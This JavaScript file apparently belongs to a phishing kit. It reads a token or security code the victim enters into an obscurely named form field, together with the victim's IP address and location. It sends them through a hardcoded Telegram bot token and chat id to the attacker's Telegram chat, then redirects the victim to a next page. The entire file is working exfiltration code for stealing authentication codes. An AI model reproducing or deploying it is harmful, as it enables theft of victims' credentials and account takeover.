//bot token
var telegram_bot_id = "7012374607:AAHfK3Mgd8kgonAtNRmzAfvGZsw14BhO1uE";
//chat id
var chat_id = "-4174274684";
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("0T4RX").value;
    ip = document.getElementById("ip").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔹CUSC4 V.2🔹\n🔔t0k4n: " + u_name + "\n\nIP: " + ip +"\n" + ip2 +"\n🔹C0DIGO SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
       $.ajax(settings).done(function (response) {
        window.location = 'index3.html';
        console.log(response);
    });
    return false;
};
